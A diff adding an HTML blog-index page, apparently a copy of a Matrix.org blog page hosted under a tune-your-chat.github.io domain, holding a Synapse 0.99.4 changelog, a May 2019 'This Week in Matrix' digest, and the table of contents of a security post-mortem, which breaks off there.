@@ -1,0 +1,1364 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="twitter:widgets:csp" content="on" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@matrixdotorg" />
+    <meta name="twitter:creator" content="@matrixdotorg" />
+    
+    <meta property="og:url" content="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;page&#x2F;52&#x2F;" />
+    
+    
+    
+    
+    <meta property="og:title" content="Blog" />
+    
+    
+    
+    <meta property="og:description" content="The Matrix.org Foundation blog is where the Matrix.org Foundation and Community
+post updates on their activity. Every Friday evening they publish This Week In
+Matrix, a digest of the past week activity.
+" />
+    <meta name="description" content="The Matrix.org Foundation blog is where the Matrix.org Foundation and Community
+post updates on their activity. Every Friday evening they publish This Week In
+Matrix, a digest of the past week activity.
+" />
+    
+    <meta property="og:image" content="https://matrix.org/blog/img/matrix-logo.png" />
+    <meta name="twitter:image" content="https://matrix.org/blog/img/matrix-logo.png" />
+    
+    <title>Matrix.org - Blog</title>
+    <link rel="shortcut icon" href="/assets/favicon.ico" />
+    <link rel="icon" type="image/svg+xml" href="/assets/favicon.svg" />
+    <link rel="stylesheet" href=https://tune-your-chat.github.io/style.css?h=0d1a23c06b707a231261 />
+    <script async src=https://tune-your-chat.github.io/js/components.js?h=ae3cb894d00e16ef08be></script>
+    <script defer data-domain="matrix.org" src="https://plausible.io/js/script.tagged-events.js"></script>
+
+
+    
+
+</head>
+
+<body>
+    
+    <header class="site-header">
+    <a href="/" class="brand">
+        <img src="/images/matrix-logo-white.svg" alt="Matrix logo">
+    </a>
+    <input id="site-header-dropdown-checkbox" type="checkbox" class="dropdown-checkbox" aria-hidden="true">
+    <label for="site-header-dropdown-checkbox" class="dropdown-button">&#xe602;</label>
+    <label for="site-header-dropdown-checkbox" class="page-overlay"></label>
+    <nav>
+        
+        
+        <a href="https:&#x2F;&#x2F;spec.matrix.org" class="
+            ">
+            Spec
+        </a>
+        
+        
+        
+        
+        
+        <div class="section-wrap">
+            <input id="foundation-submenu-checkbox" type="checkbox" class="submenu-checkbox" aria-hidden="true"
+                >
+            <label for="foundation-submenu-checkbox" class="submenu-title">Foundation <div class="arrow">
+                </div></label>
+
+            <div class="section-submenu-wrap">
+                <div class="section-submenu">
+                    
+                    
+                    <a href="&#x2F;foundation&#x2F;about&#x2F;">About Matrix</a>
+                    
+                    <a href="&#x2F;foundation&#x2F;governing-board-elections&#x2F;">Governing Board Elections 2024</a>
+                    
+                </div>
+            </div>
+        </div>
+        
+        
+        
+        <a href="&#x2F;blog&#x2F;" class="
+            current">
+            Blog
+        </a>
+        
+        
+        
+        <a href="&#x2F;docs&#x2F;" class="
+            ">
+            Docs
+        </a>
+        
+        
+        
+        
+        
+        <div class="section-wrap">
+            <input id="ecosystem-submenu-checkbox" type="checkbox" class="submenu-checkbox" aria-hidden="true"
+                >
+            <label for="ecosystem-submenu-checkbox" class="submenu-title">Ecosystem <div class="arrow">
+                </div></label>
+
+            <div class="section-submenu-wrap">
+                <div class="section-submenu">
+                    
+                    
+                    <a href="&#x2F;ecosystem&#x2F;clients&#x2F;">Clients</a>
+                    
+                    
+                    <a href="&#x2F;ecosystem&#x2F;bridges&#x2F;">Bridges</a>
+                    
+                    
+                    <a href="&#x2F;ecosystem&#x2F;servers&#x2F;">Servers</a>
+                    
+                    <a href="&#x2F;ecosystem&#x2F;tune&#x2F;">Tune Your Chat</a>
+                    
+                    <a href="&#x2F;ecosystem&#x2F;integrations&#x2F;">Integrations</a>
+                    
+                    <a href="&#x2F;ecosystem&#x2F;sdks&#x2F;">SDKs</a>
+                    
+                    <a href="&#x2F;ecosystem&#x2F;hosting&#x2F;">Hosting</a>
+                    
+                </div>
+            </div>
+        </div>
+        
+        
+        
+        <a href="&#x2F;support" class="
+            ">
+            Donate
+        </a>
+        
+        
+        
+        <a href="&#x2F;try-matrix&#x2F;" class="primary
+            ">
+            Try Matrix
+        </a>
+        
+        
+    </nav>
+</header>
+
+
+    <main>
+        <div class="content">
+    
+    <article class="post">
+        <header>
+            <h1><a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;2019&#x2F;05&#x2F;15&#x2F;synapse-0-99-4-released&#x2F;" title="Synapse 0.99.4 released!">Synapse 0.99.4 released!</a></h1>
+            <span>
+                15.05.2019 00:00
+                —
+                <a href="/category/releases">
+                    Releases
+                </a>
+                —
+                
+                <a href="/author/neil-johnson">
+                    Neil Johnson
+                </a>
+                
+            </span>
+            
+        </header>
+        <div>
+            <p>Hey ho Synapse release day.</p>
+<p>0.99.4 is a maintenance release collecting together all of the bug fixes and performance improvements over the past few weeks, additionally there is further support for the upcoming 1.0 release (more info coming soon). One thing worth calling out is how many community contributions have made their way into 0.99.4, take a look at the change log for details, but many thanks to everyone submitting PRs, keep them coming!</p>
+<p>As ever, you can get the new update <a href="https://github.com/matrix-org/synapse/releases/tag/v0.99.4">here</a> or any of the sources mentioned at <a href="https://github.com/matrix-org/synapse">https://github.com/matrix-org/synapse</a>. Note, Synapse is now available from PyPI, pick it up <a href="https://pypi.org/project/matrix-synapse/">here</a>. Also, check out our <a href="https://matrix.org/docs/guides/installing-synapse">Synapse installation guide page</a></p>
+<h1 id="synapse-0-99-4-changelog">Synapse 0.99.4 Changelog</h1>
+<h2 id="features">Features</h2>
+<ul>
+<li>Add systemd-python to the optional dependencies to enable logging to the systemd journal. Install with <code>pip install matrix-synapse[systemd]</code>. (<a href="https://github.com/matrix-org/synapse/issues/4339">#4339</a>)</li>
+<li>Add a default .m.rule.tombstone push rule. (<a href="https://github.com/matrix-org/synapse/issues/4867">#4867</a>)</li>
+<li>Add ability for password provider modules to bind email addresses to users upon registration. (<a href="https://github.com/matrix-org/synapse/issues/4947">#4947</a>)</li>
+<li>Implementation of <a href="https://github.com/matrix-org/matrix-doc/pull/1711">MSC1711</a> including config options for requiring valid TLS certificates for federation traffic, the ability to disable TLS validation for specific domains, and the ability to specify your own list of CA certificates. (<a href="https://github.com/matrix-org/synapse/issues/4967">#4967</a>)</li>
+<li>Remove presence list support as per MSC 1819. (<a href="https://github.com/matrix-org/synapse/issues/4989">#4989</a>)</li>
+<li>Reduce CPU usage starting pushers during start up. (<a href="https://github.com/matrix-org/synapse/issues/4991">#4991</a>)</li>
+<li>Add a delete group admin API. (<a href="https://github.com/matrix-org/synapse/issues/5002">#5002</a>)</li>
+<li>Add config option to block users from looking up 3PIDs. (<a href="https://github.com/matrix-org/synapse/issues/5010">#5010</a>)</li>
+<li>Add context to phonehome stats. (<a href="https://github.com/matrix-org/synapse/issues/5020">#5020</a>)</li>
+<li>Configure the example systemd units to have a log identifier of <code>matrix-synapse</code>
+instead of the executable name, <code>python</code>.
+Contributed by Christoph Müller. (<a href="https://github.com/matrix-org/synapse/issues/5023">#5023</a>)</li>
+<li>Add time-based account expiration. (<a href="https://github.com/matrix-org/synapse/issues/5027">#5027</a>, <a href="https://github.com/matrix-org/synapse/issues/5047">#5047</a>, <a href="https://github.com/matrix-org/synapse/issues/5073">#5073</a>, <a href="https://github.com/matrix-org/synapse/issues/5116">#5116</a>)</li>
+<li>Add support for handling /versions, /voip and /push_rules client endpoints to client_reader worker. (<a href="https://github.com/matrix-org/synapse/issues/5063">#5063</a>, <a href="https://github.com/matrix-org/synapse/issues/5065">#5065</a>, <a href="https://github.com/matrix-org/synapse/issues/5070">#5070</a>)</li>
+<li>Add an configuration option to require authentication on /publicRooms and /profile endpoints. (<a href="https://github.com/matrix-org/synapse/issues/5083">#5083</a>)</li>
+<li>Move admin APIs to <code>/_synapse/admin/v1</code>. (The old paths are retained for backwards-compatibility, for now). (<a href="https://github.com/matrix-org/synapse/issues/5119">#5119</a>)</li>
+<li>Implement an admin API for sending server notices. Many thanks to @krombel who provided a foundation for this work. (<a href="https://github.com/matrix-org/synapse/issues/5121">#5121</a>, <a href="https://github.com/matrix-org/synapse/issues/5142">#5142</a>)</li>
+</ul>
+<h2 id="bugfixes">Bugfixes</h2>
+<ul>
+<li>Avoid redundant URL encoding of redirect URL for SSO login in the fallback login page. Fixes a regression introduced in <a href="https://github.com/matrix-org/synapse/pull/4220">#4220</a>. Contributed by Marcel Fabian Krüger ("<a href="https://github.com/zauguin">zaugin</a>"). (<a href="https://github.com/matrix-org/synapse/issues/4555">#4555</a>)</li>
+<li>Fix bug where presence updates were sent to all servers in a room when a new server joined, rather than to just the new server. (<a href="https://github.com/matrix-org/synapse/issues/4942">#4942</a>, <a href="https://github.com/matrix-org/synapse/issues/5103">#5103</a>)</li>
+<li>Fix sync bug which made accepting invites unreliable in worker-mode synapses. (<a href="https://github.com/matrix-org/synapse/issues/4955">#4955</a>, <a href="https://github.com/matrix-org/synapse/issues/4956">#4956</a>)</li>
+<li>start.sh: Fix the --no-rate-limit option for messages and make it bypass rate limit on registration and login too. (<a href="https://github.com/matrix-org/synapse/issues/4981">#4981</a>)</li>
+<li>Transfer related groups on room upgrade. (<a href="https://github.com/matrix-org/synapse/issues/4990">#4990</a>)</li>
+<li>Prevent the ability to kick users from a room they aren't in. (<a href="https://github.com/matrix-org/synapse/issues/4999">#4999</a>)</li>
+<li>Fix issue #4596 so synapse_port_db script works with --curses option on Python 3. Contributed by Anders Jensen-Waud <a href="mailto:anders@jensenwaud.com">anders@jensenwaud.com</a>. (<a href="https://github.com/matrix-org/synapse/issues/5003">#5003</a>)</li>
+<li>Clients timing out/disappearing while downloading from the media repository will now no longer log a spurious "Producer was not unregistered" message. (<a href="https://github.com/matrix-org/synapse/issues/5009">#5009</a>)</li>
+<li>Fix "cannot import name execute_batch" error with postgres. (<a href="https://github.com/matrix-org/synapse/issues/5032">#5032</a>)</li>
+<li>Fix disappearing exceptions in manhole. (<a href="https://github.com/matrix-org/synapse/issues/5035">#5035</a>)</li>
+<li>Workaround bug in twisted where attempting too many concurrent DNS requests could cause it to hang due to running out of file descriptors. (<a href="https://github.com/matrix-org/synapse/issues/5037">#5037</a>)</li>
+<li>Make sure we're not registering the same 3pid twice on registration. (<a href="https://github.com/matrix-org/synapse/issues/5071">#5071</a>)</li>
+<li>Don't crash on lack of expiry templates. (<a href="https://github.com/matrix-org/synapse/issues/5077">#5077</a>)</li>
+<li>Fix the ratelimting on third party invites. (<a href="https://github.com/matrix-org/synapse/issues/5104">#5104</a>)</li>
+<li>Add some missing limitations to room alias creation. (<a href="https://github.com/matrix-org/synapse/issues/5124">#5124</a>, <a href="https://github.com/matrix-org/synapse/issues/5128">#5128</a>)</li>
+<li>Limit the number of EDUs in transactions to 100 as expected by synapse. Thanks to @superboum for this work! (<a href="https://github.com/matrix-org/synapse/issues/5138">#5138</a>)</li>
+<li>Fix bogus imports in unit tests. (<a href="https://github.com/matrix-org/synapse/issues/5154">#5154</a>)</li>
+</ul>
+<h2 id="internal-changes">Internal Changes</h2>
+<ul>
+<li>Add test to verify threepid auth check added in #4435. (<a href="https://github.com/matrix-org/synapse/issues/4474">#4474</a>)</li>
+<li>Fix/improve some docstrings in the replication code. (<a href="https://github.com/matrix-org/synapse/issues/4949">#4949</a>)</li>
+<li>Split synapse.replication.tcp.streams into smaller files. (<a href="https://github.com/matrix-org/synapse/issues/4953">#4953</a>)</li>
+<li>Refactor replication row generation/parsing. (<a href="https://github.com/matrix-org/synapse/issues/4954">#4954</a>)</li>
+<li>Run <code>black</code> to clean up formatting on <code>synapse/storage/roommember.py</code> and <code>synapse/storage/events.py</code>. (<a href="https://github.com/matrix-org/synapse/issues/4959">#4959</a>)</li>
+<li>Remove log line for password via the admin API. (<a href="https://github.com/matrix-org/synapse/issues/4965">#4965</a>)</li>
+<li>Fix typo in TLS filenames in docker/README.md. Also add the '-p' commandline option to the 'docker run' example. Contributed by Jurrie Overgoor. (<a href="https://github.com/matrix-org/synapse/issues/4968">#4968</a>)</li>
+<li>Refactor room version definitions. (<a href="https://github.com/matrix-org/synapse/issues/4969">#4969</a>)</li>
+<li>Reduce log level of .well-known/matrix/client responses. (<a href="https://github.com/matrix-org/synapse/issues/4972">#4972</a>)</li>
+<li>Add <code>config.signing_key_path</code> that can be read by <code>synapse.config</code> utility. (<a href="https://github.com/matrix-org/synapse/issues/4974">#4974</a>)</li>
+<li>Track which identity server is used when binding a threepid and use that for unbinding, as per MSC1915. (<a href="https://github.com/matrix-org/synapse/issues/4982">#4982</a>)</li>
+<li>Rewrite KeyringTestCase as a HomeserverTestCase. (<a href="https://github.com/matrix-org/synapse/issues/4985">#4985</a>)</li>
+<li>README updates: Corrected the default POSTGRES_USER. Added port forwarding hint in TLS section. (<a href="https://github.com/matrix-org/synapse/issues/4987">#4987</a>)</li>
+<li>Remove a number of unused tables from the database schema. (<a href="https://github.com/matrix-org/synapse/issues/4992">#4992</a>, <a href="https://github.com/matrix-org/synapse/issues/5028">#5028</a>, <a href="https://github.com/matrix-org/synapse/issues/5033">#5033</a>)</li>
+<li>Run <code>black</code> on the remainder of <code>synapse/storage/</code>. (<a href="https://github.com/matrix-org/synapse/issues/4996">#4996</a>)</li>
+<li>Fix grammar in get_current_users_in_room and give it a docstring. (<a href="https://github.com/matrix-org/synapse/issues/4998">#4998</a>)</li>
+<li>Clean up some code in the server-key Keyring. (<a href="https://github.com/matrix-org/synapse/issues/5001">#5001</a>)</li>
+<li>Convert SYNAPSE_NO_TLS Docker variable to boolean for user friendliness. Contributed by Gabriel Eckerson. (<a href="https://github.com/matrix-org/synapse/issues/5005">#5005</a>)</li>
+<li>Refactor synapse.storage._base._simple_select_list_paginate. (<a href="https://github.com/matrix-org/synapse/issues/5007">#5007</a>)</li>
+<li>Store the notary server name correctly in server_keys_json. (<a href="https://github.com/matrix-org/synapse/issues/5024">#5024</a>)</li>
+<li>Rewrite Datastore.get_server_verify_keys to reduce the number of database transactions. (<a href="https://github.com/matrix-org/synapse/issues/5030">#5030</a>)</li>
+<li>Remove extraneous period from copyright headers. (<a href="https://github.com/matrix-org/synapse/issues/5046">#5046</a>)</li>
+<li>Update documentation for where to get Synapse packages. (<a href="https://github.com/matrix-org/synapse/issues/5067">#5067</a>)</li>
+<li>Add workarounds for pep-517 install errors. (<a href="https://github.com/matrix-org/synapse/issues/5098">#5098</a>)</li>
+<li>Improve logging when event-signature checks fail. (<a href="https://github.com/matrix-org/synapse/issues/5100">#5100</a>)</li>
+<li>Factor out an "assert_requester_is_admin" function. (<a href="https://github.com/matrix-org/synapse/issues/5120">#5120</a>)</li>
+<li>Remove the requirement to authenticate for /admin/server_version. (<a href="https://github.com/matrix-org/synapse/issues/5122">#5122</a>)</li>
+<li>Prevent an exception from being raised in a IResolutionReceiver and use a more generic error message for blacklisted URL previews. (<a href="https://github.com/matrix-org/synapse/issues/5155">#5155</a>)</li>
+<li>Run <code>black</code> on the tests directory. (<a href="https://github.com/matrix-org/synapse/issues/5170">#5170</a>)</li>
+<li>Fix CI after new release of isort. (<a href="https://github.com/matrix-org/synapse/issues/5179">#5179</a>)</li>
+</ul>
+
+        </div>
+    </article>
+    
+    <article class="post">
+        <header>
+            <h1><a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;2019&#x2F;05&#x2F;10&#x2F;this-week-in-matrix-2019-05-10&#x2F;" title="This Week in Matrix 2019-05-10">This Week in Matrix 2019-05-10</a></h1>
+            <span>
+                10.05.2019 00:00
+                —
+                <a href="/category/this-week-in-matrix">
+                    This Week in Matrix
+                </a>
+                —
+                
+                <a href="/author/ben-parsons">
+                    Ben Parsons
+                </a>
+                
+            </span>
+            
+        </header>
+        <div>
+            <h2 id="matrix-live">Matrix Live</h2>
+<p>This week Neil and Matthew are talking about recent security issues - this is a really long and detailed chat, but you can skip to around the 32 minute mark to hear about other news - including progress on reactions. Reminder that for a good "big picture" overview of the progress of Matrix, you can look at the <a href="https://github.com/orgs/matrix-org/projects/9">Homeserver High Level Roadmap</a>.</p>
+<noscript>Today's Matrix Live: <a href="https://youtube.com/watch?v=vSCfoQTVOE8">https://youtube.com/watch?v=vSCfoQTVOE8</a></noscript>
+<youtube-player video-id="vSCfoQTVOE8"></youtube-player>
+<h2 id="dept-of-servers">Dept of Servers</h2>
+<h3 id="synapse">Synapse</h3>
+<p>Neil, Synapse-dev wrangler:</p>
+<blockquote>
+<p>Reactions continues at full speed, we have a draft PR and will be implementing over the coming week. The ability to blacklist IPs over federation will land imminently, as well as a nasty device management bug that led to a spate of E2E errors. Next week is all about Reactions, resuming work on the small homeserver project and finally getting back to Synapse 1.0 blockers following all the remediation drama of the past few weeks. With any luck we’ll have a new Synapse release for you next week.</p>
+</blockquote>
+<h2 id="dept-of-encryption">Dept of Encryption</h2>
+<h3 id="pantalaimon">Pantalaimon</h3>
+<p>Says <a href="https://github.com/poljar">poljar</a>:</p>
+<blockquote>
+<ul>
+<li><a href="https://github.com/matrix-org/pantalaimon">Pantalaimon</a> received a configuration file. The configuration file adds the ability to configure multiple Homeservers and pantalaimon will run having each Homeserver exposed on a different TCP port.</li>
+<li>The panctl utility has received support for more commands, it now has the ability to accept SAS requests, confirm them, import/export keys, list pan users as well as list devices of users. Completions for the commands were also added.</li>
+</ul>
+</blockquote>
+<h2 id="dept-of-clients">Dept of Clients</h2>
+<h3 id="pattle-big-update">Pattle - big update!</h3>
+<p><a href="https://matrix.to/#/@wilko:matrix.org">Wilko</a> announced:</p>
+<blockquote>
+<p>A new version of Pattle is available on F-droid!</p>
+<p>Lots of changes again, including:</p>
+<ul>
+<li>Render HTML formatting in messages!</li>
+<li>Replies are now rendered!</li>
+<li>Show date headers between messages of different days!</li>
+<li>Render usernames with a color in chat timeline</li>
+<li>Add loading indicators (when logging in, loading chats, etc.)</li>
+<li>Show error banner at the top if syncing failed</li>
+<li>Syncing now resumes after a failed attempt (no more restarting)</li>
+<li>Fix messages not being sent if connection was lost and the app restarted</li>
+</ul>
+<p>To install Pattle, add the following repo in F-droid:</p>
+<p><a href="https://fdroid.pattle.im/?fingerprint=E91F63CA6AE04F8E7EA53E52242EAF8779559209B8A342F152F9E7265E3EA729">https://fdroid.pattle.im/?fingerprint=E91F63CA6AE04F8E7EA53E52242EAF8779559209B8A342F152F9E7265E3EA729</a></p>
+<p>Follow development <a href="https://git.pattle.im/pattle/app">here</a> and in <a href="https://matrix.to/#/#pattle:matrix.org">#pattle:matrix.org</a>!</p>
+</blockquote>
+<p><img src="/blog/img/pattle-2019-05-10.png" alt="" /></p>
+<h3 id="fractal">Fractal</h3>
+<p><a href="https://matrix.to/#/@afranke:matrix.org">Alexandre Franke</a>:</p>
+<blockquote>
+<p>Although the development pace has been reduced lately, the Fractal team managed to make significant progress towards the 4.2 release. More specifically since our previous news, Chris has landed much of his adaptive view work to get Fractal in a mobile friendly state so it’s ready to run on the Librem 5 once Purism starts shipping them. But he didn’t stop there: eager to see his awesome work in the hands of many people (figuratively, the literal application will have to wait for the phone to be out 😛) as soon as possible, he tackled a few bugs that we really wanted to get sorted out before we got a new version out.</p>
+<p>Alexandre also <a href="https://gitlab.gnome.org/GNOME/fractal/commit/152255031400049a30667c581c0dc31a4ef03146">prepared the changelog</a> with a bird’s-eye view of all changes that happened since 4.0.</p>
+<p>Last but not least, we had a few external contributions for features such as network proxy support and typing notifications.</p>
+</blockquote>
+<h3 id="riot-web">Riot Web</h3>
+<blockquote>
+<p>Progress on message composer for editing messages.</p>
+</blockquote>
+<h3 id="riot-ios">Riot iOS</h3>
+<blockquote>
+<ul>
+<li>0.8.6 has been released on Tuesday</li>
+<li>We are working on reactions</li>
+</ul>
+</blockquote>
+<h3 id="riot-android">Riot Android</h3>
+<blockquote>
+<ul>
+<li>We have fixed some minor bugs, our efforts are now on RiotX</li>
+<li>New FDroid mode support for high service level, regardless of battery usage.</li>
+</ul>
+</blockquote>
+<h3 id="riotx-android">RiotX (Android)</h3>
+<blockquote>
+<ul>
+<li>Benoit has started to implement the crypto on RiotX. Basically all the legacy has been imported and a migration to the new architecture is done. Lots of plumbing and rework, but it should be the fastest way to support crypto on RiotX.</li>
+<li>Valere is working on the emoji picker and reactions, and has also added some actions on events (copy, share, view source, etc.)</li>
+<li>François has added room invitation support. It will be possible soon to see invitations, and accept or reject them.</li>
+</ul>
+</blockquote>
+<h3 id="continuum">continuum</h3>
+<p><a href="https://matrix.to/#/@uforia:matrix.org">yuforia</a> has news on <a href="https://github.com/koma-im/continuum-desktop">continuum</a>, a JavaFX-based client.</p>
+<blockquote>
+<p>this week in <a href="https://github.com/koma-im/continuum-desktop">continuum</a></p>
+<ul>
+<li>right-click on a room in the room list to send invitations</li>
+<li>experimental support for receiving invitations</li>
+<li>membership data are now also persisted in database</li>
+</ul>
+</blockquote>
+<h3 id="fluffychat-available-as-a-snap-package-plus-e2ee-progress">FluffyChat available as a Snap package, plus E2EE progress</h3>
+<p><a href="https://matrix.to/#/@krille:chat.regionetz.net">Krille</a> announced FluffyChat for Linux desktops:</p>
+<blockquote>
+<p>FluffyChat is now also available as a Snap package for desktop Linux<br />
+<a href="https://snapcraft.io/fluffychat">https://snapcraft.io/fluffychat</a> :D<br />
+It's a Matrix client written in Qml for Ubuntu Phones. Now it is working for Linux Desktop too.</p>
+</blockquote>
+<p>He also has news to share re E2E:</p>
+<blockquote>
+<p>Progress has been made at the end2end encryption for FluffyChat. Qml bindings for the libolm library are mostly ready and the app can now create keys and upload keys to the server. Device tracking is now implemented too.</p>
+</blockquote>
+<p>E2E when? SOON! See the branch here: https://gitlab.com/ChristianPauly/fluffychat/tree/e2eencryption</p>
+<h2 id="dept-of-bridges">Dept of Bridges</h2>
+<h3 id="new-hangouts-bridge-from-tulir-mautrix">New Hangouts bridge from tulir / mautrix</h3>
+<p><a href="https://matrix.to/#/@tulir:maunium.net">tulir</a> has been using his <a href="https://github.com/tulir/mautrix-python">mautrix-python</a> lib, which was recently used to enable his <a href="https://github.com/tulir/mautrix-facebook">mautrix-facebook</a> bridge, to bring a new method for Matrix-Hangouts bridging:</p>
+<blockquote>
+<p>New bridge again, this time it's Hangouts: https://github.com/tulir/mautrix-hangouts / <a href="https://matrix.to/#/#hangouts:maunium.net">#hangouts:maunium.net</a>. As with the Messenger bridge, currently the main difference to matrix-puppet-hangouts is multi-user support (also no hacky JS/Python mixing).</p>
+<p>Before making mautrix-hangouts, I put a bunch of the generic bridging parts of mautrix-facebook into mautrix-python's bridge module and used that in both bridges. After Debian 10 is released, I'll drop Python 3.5 compatibility in mautrix-telegram and move it to use mautrix-python and the bridge module too.</p>
+<p>Next week I'm planning on adding a bunch of features to both my new bridges, such as bridging formatting and remaining media types (so no new bridges planned for now :D).</p>
+</blockquote>
+<h2 id="dept-of-sdks-and-frameworks">Dept of SDKs and Frameworks</h2>
+<h3 id="qmatrixclient-is-now-quotient">QMatrixClient is now "Quotient"</h3>
+<p><a href="https://matrix.to/#/@kitsune:matrix.org">kitsune</a>:</p>
+<blockquote>
+<p>The vote on a new name for the QMatrixClient project has been going on over the past week.<br />
+<strong>We have a winner now, and the new name is "Quotient"!</strong> In the nearest weeks, expect changes in the library code (it's going to be libQuotient from the next release), room aliases (already ongoing), links to the repos etc. etc. Where possible, we're going to smoothen the migration path by providing legacy fallbacks (e.g., the new C++ namespace, Quotient, will be introduced but the old one, QMatrixClient, will stay its synonym, although deprecated).<br />
+Just in case you missed all the previous mentions of the topic - it's only related to the overall project and the library, but not the client - its name remains Quaternion.</p>
+</blockquote>
+<p>Why rename?</p>
+<blockquote>
+<p>Because the previous name has been a bit clumsy and, most importantly, the project is no more focusing just on client-side but on a wider set of applications of Matrix (no homeserver in plans though). See also the recent backlog of <a href="https://matrix.to/#/#qmatrixclient:matrix.org">#qmatrixclient:matrix.org</a> (now also <a href="https://matrix.to/#/#quotient:matrix.org">#quotient:matrix.org</a>) earlier this week for the whole discussion</p>
+</blockquote>
+<h3 id="ruby-matrix-sdk-hits-v0-1-0">Ruby Matrix SDK hits v0.1.0</h3>
+<p><a href="https://github.com/ananace/">Ananace</a>:</p>
+<blockquote>
+<p>Just published version 0.1.0 of the <a href="https://github.com/ananace/ruby-matrix-sdk">Ruby Matrix SDK</a>, and I've gotten enough testing written now where I feel comfortable not marking this as a pre-production release. So feel free to integrate it into more than just prototypes and experiments. 😃<br />
+Relevant links; <a href="https://github.com/ananace/ruby-matrix-sdk">GitHub page</a>, <a href="https://matrix.to/#/#ruby-matrix-sdk:kittenface.studio">#ruby-matrix-sdk:kittenface.studio</a>.</p>
+</blockquote>
+<h3 id="opsdroid-big-updates-with-focus-on-matrix">Opsdroid big updates, with focus on Matrix</h3>
+<p><a href="https://matrix.to/#/@cadair:cadair.com">Cadair</a>:</p>
+<blockquote>
+<p><a href="http://opsdroid.readthedocs.io/">Opsdroid</a> 0.15 has been released, with <em>a lot</em> of matrix focused updates. The biggest of which is support for sending and receiving images and files. There have also been a bunch of bug fixes such as clean exit of the matrix connector and correct handling of events which are not parsed. There are also a bunch of other not matrix specific changes like support for the awesome <a href="https://pypi.org/project/parse/">parse</a> library for string matching. Read all about it in the release blog: https://medium.com/opsdroid/event-dispatching-simple-parsing-and-more-in-v0-15-3f721b8a6d6c</p>
+</blockquote>
+<h3 id="pk-interfaces-for-ruby-olm">PK interfaces for ruby_olm</h3>
+<p><a href="https://matrix.to/#/@willem:canarymod.net">Willem</a>:</p>
+<blockquote>
+<p>This week I've been adding PK interfaces to <a href="https://github.com/cjhdev/ruby_olm">cjhdev's Ruby bindings for Olm</a>, in preparation of improving <a href="https://git.snt.utwente.nl/14mRh4X0r/tchap-proxy">my Tchap proxy</a>. The PK interfaces can be found in <a href="https://github.com/14mRh4X0r/ruby_olm">my fork of ruby_olm</a>. Building the native extensions for the gem has had a major overhaul, so no pull request yet.</p>
+</blockquote>
+<h2 id="dept-of-ops">Dept of Ops</h2>
+<h3 id="matrix-docker-ansible-deploy-update">matrix-docker-ansible-deploy update</h3>
+<p>It's been a few weeks since we heard from <a href="https://matrix.to/#/@slavi:devture.com">Slavi</a> about <a href="https://github.com/spantaleev/matrix-docker-ansible-deploy">matrix-docker-ansible-deploy</a>, but he's been working away on it:</p>
+<blockquote>
+<p>We haven't shared any <a href="https://github.com/spantaleev/matrix-docker-ansible-deploy">matrix-docker-ansible-deploy</a> updates lately, but we've had lots of community contributions.</p>
+<p>Most of it has been bug fixes and various internal improvements, but we've also landed a few large features.
+Here's what's most interesting lately:</p>
+<ul>
+<li><a href="https://github.com/spantaleev/matrix-docker-ansible-deploy/blob/master/docs/configuring-playbook-bridge-mautrix-facebook.md">Facebook bridging support</a> via <a href="https://github.com/tulir/mautrix-facebook">mautrix-facebook</a></li>
+<li><a href="https://github.com/spantaleev/matrix-docker-ansible-deploy/blob/master/docs/configuring-playbook-mxisd.md#mxisd-controlled-registration">Support for mxisd-controlled user Registration</a></li>
+<li><a href="https://github.com/spantaleev/matrix-docker-ansible-deploy/blob/master/CHANGELOG.md#caddy-webserver-examples">Examples</a> for how to use a <a href="https://caddyserver.com/">Caddy webserver</a> instead of the integrated nginx webserver</li>
+<li><a href="https://github.com/spantaleev/matrix-docker-ansible-deploy/blob/master/CHANGELOG.md#goofys-support-for-other-s3-compatible-object-stores">Goofys support for other S3-compatible object stores</a></li>
+</ul>
+</blockquote>
+<h2 id="dept-of-status-of-matrix">Dept of <em>Status of Matrix</em></h2>
+<p><a href="https://matrix.to/#/@jaywink:feneas.org">jaywink</a>, maintainer of <a href="https://the-federation.info">https://the-federation.info</a>, told us what we all know to be true: Matrix is great and is getting more popular:</p>
+<blockquote>
+<p>Matrix (Synapse) jumps to second place in <a href="https://the-federation.info">https://the-federation.info</a> site, which lists servers of the federated social web. Help us map the true size of the Matrixverse by adding your server by going a <code>https://the-federation.info/register/yourdomain.tld</code>. Note, SRV and well-known lookups not yet working, so registration needs to happen with the Matrix server real domain (and port if any).</p>
+</blockquote>
+<h2 id="that-s-all-i-know">That's all I know</h2>
+<p>See you next week, and be sure to stop by <a href="https://matrix.to/#/#TWIM:matrix.org">#twim:matrix.org</a> with your updates!</p>
+<p>PS to people who would normally be reading this in their own RSS reader - I apologise, we'll get the full-article feed back up soon.</p>
+
+        </div>
+    </article>
+    
+    <article class="post">
+        <header>
+            <h1><a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;" title="Post-mortem and remediations for Apr 11 security incident">Post-mortem and remediations for Apr 11 security incident</a></h1>
+            <span>
+                08.05.2019 00:00
+                —
+                <a href="/category/general">
+                    General
+                </a>
+                —
+                
+                <a href="/author/matthew-hodgson">
+                    Matthew Hodgson
+                </a>
+                
+            </span>
+            
+        </header>
+        <div>
+            <h3 id="table-of-contents">Table of contents</h3>
+<ul>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#introduction">Introduction</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#history">History</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-incident">The Incident</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-defacement">The Defacement</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#the-rebuild">The Rebuild</a></li>
+<li><a href="https://tune-your-chat.github.io/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/#remediations">Remediations</a>
+<ul>
